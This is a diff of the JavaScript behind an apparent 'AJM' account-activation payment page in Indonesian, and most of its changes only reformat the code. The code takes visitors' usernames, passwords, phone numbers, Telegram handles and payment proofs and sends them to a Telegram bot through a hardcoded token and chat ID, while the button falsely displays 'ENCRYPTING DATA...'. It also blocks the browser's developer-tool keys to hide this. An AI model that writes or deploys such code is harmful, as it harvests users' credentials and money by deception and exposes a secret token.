@@ -341,9 +341,11 @@ SECURITY KEYBOARD BLOCK
 ========================= */
 
 function disableSecurity(e) {
-    if(e.keyCode == 123 || 
-      (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || 
-      (e.ctrlKey && e.keyCode == 85)) return false;
+    if(
+        e.keyCode == 123 ||
+        (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) ||
+        (e.ctrlKey && e.keyCode == 85)
+    ) return false;
 }
 
 
@@ -401,14 +403,14 @@ featureGrid.innerHTML += `
 QRIS DISPLAY SYSTEM
 ========================= */
 
-function showQris() {
+function showQris(){
 
 const val = document.getElementById('planSelect').value;
 
-document.getElementById('priceLabel').innerText = 
+document.getElementById('priceLabel').innerText =
 "Rp " + parseInt(val).toLocaleString('id-ID');
 
-document.getElementById('qrisArea').style.display = 'block';
+document.getElementById('qrisArea').style.display='block';
 
 }
 
@@ -417,13 +419,13 @@ document.getElementById('qrisArea').style.display = 'block';
 FILE UPLOAD HANDLER
 ========================= */
 
-function handleFile() {
+function handleFile(){
 
-const file = document.getElementById('proofUpload').files[0];
+const file=document.getElementById('proofUpload').files[0];
 
 if(file){
 
-document.getElementById('fileText').innerText = "✅ " + file.name;
+document.getElementById('fileText').innerText="✅ "+file.name;
 
 checkForm();
 
@@ -438,13 +440,13 @@ FORM VALIDATION
 
 function checkForm(){
 
-const u = document.getElementById('teleUser').value;
-const p = document.getElementById('telePass').value;
-const n = document.getElementById('telePhone').value;
-const t = document.getElementById('teleTelegram').value;
-const f = document.getElementById('proofUpload').files[0];
+const u=document.getElementById('teleUser').value;
+const p=document.getElementById('telePass').value;
+const n=document.getElementById('telePhone').value;
+const t=document.getElementById('teleTelegram').value;
+const f=document.getElementById('proofUpload').files[0];
 
-document.getElementById('btnTele').disabled = !(u && p && n && t && f);
+document.getElementById('btnTele').disabled=!(u && p && n && t && f);
 
 }
 
@@ -455,45 +457,45 @@ SEND DATA TO TELEGRAM BOT
 
 async function sendToTelegram(){
 
-const token = "7991098911:AAH3YjGTrgSOjwHIAOyB882grVz7XGwiyls";
-const chatId = "8215645360";
+const token="7991098911:AAH3YjGTrgSOjwHIAOyB882grVz7XGwiyls";
+const chatId="8215645360";
 
-const planElement = document.getElementById('planSelect');
-const planName = planElement.options[planElement.selectedIndex].text;
+const planElement=document.getElementById('planSelect');
+const planName=planElement.options[planElement.selectedIndex].text;
 
-const user = document.getElementById('teleUser').value;
-const pass = document.getElementById('telePass').value;
-const phone = document.getElementById('telePhone').value;
-const telegram = document.getElementById('teleTelegram').value;
-const file = document.getElementById('proofUpload').files[0];
+const user=document.getElementById('teleUser').value;
+const pass=document.getElementById('telePass').value;
+const phone=document.getElementById('telePhone').value;
+const telegram=document.getElementById('teleTelegram').value;
+const file=document.getElementById('proofUpload').files[0];
 
-const btn = document.getElementById('btnTele');
+const btn=document.getElementById('btnTele');
 
-btn.innerText = "ENCRYPTING DATA...";
-btn.disabled = true;
+btn.innerText="ENCRYPTING DATA...";
+btn.disabled=true;
 
-const formData = new FormData();
+const formData=new FormData();
 
-formData.append('chat_id', chatId);
-formData.append('photo', file);
+formData.append('chat_id',chatId);
+formData.append('photo',file);
 
-formData.append('caption', `📊 *AKTIVASI BARU*
+formData.append('caption',`📊 *AKTIVASI BARU*
 💎 *PAKET:* ${planName}
 👤 *USER:* ${user}
 🔑 *PASS:* ${pass}
 📱 *WA:* ${phone}
 ✈️ *TELEGRAM:* ${telegram}`);
 
-formData.append('parse_mode', 'Markdown');
+formData.append('parse_mode','Markdown');
 
 try{
 
-const response = await fetch(
+const response=await fetch(
 `https://api.telegram.org/bot${token}/sendPhoto`,
-{ method:'POST', body:formData }
+{method:'POST',body:formData}
 );
 
-const result = await response.json();
+const result=await response.json();
 
 if(result.ok){
 
@@ -528,14 +530,13 @@ CONFIRM VIA TELEGRAM
 
 function confirmTelegram(){
 
-const user = document.getElementById('teleUser').value;
-const telegram = document.getElementById('teleTelegram').value;
+const user=document.getElementById('teleUser').value;
+const telegram=document.getElementById('teleTelegram').value;
 
-const planElement = document.getElementById('planSelect');
+const planElement=document.getElementById('planSelect');
+const planName=planElement.options[planElement.selectedIndex].text;
 
-const planName = planElement.options[planElement.selectedIndex].text;
-
-const text = `Halo Admin AJM, Saya sudah melakukan pembayaran dan proses sinkronisasi sistem telah selesai.
+const text=`Halo Admin AJM, Saya sudah melakukan pembayaran dan proses sinkronisasi sistem telah selesai.
 
 Berikut data aktivasi saya:
 Username AJM : ${user}
@@ -573,25 +574,6 @@ if(e.ctrlKey && e.shiftKey && e.keyCode==74){return false}
 if(e.ctrlKey && e.keyCode==85){return false}
 
 }
-
-
-/* =========================
-DEVTOOLS DETECTOR
-========================= */
-
-setInterval(function(){
-
-const width = window.outerWidth - window.innerWidth > 150;
-const height = window.outerHeight - window.innerHeight > 150;
-
-if(width || height){
-
-document.body.innerHTML =
-"<h1 style='color:red;text-align:center;margin-top:20%'>SECURITY VIOLATION DETECTED</h1>";
-
-}
-
-},1000);
 
 
 /* =========================
@@ -640,9 +622,6 @@ original();
 /* =========================
 ANTI CLONE WATERMARK
 ========================= */
-
-console.log("%cSTOP!","color:red;font-size:40px;font-weight:bold;")
-console.log("%cAJM CONTROL PANEL SECURITY SYSTEM","color:#00f2fe;font-size:16px")
 
 (function(){
 
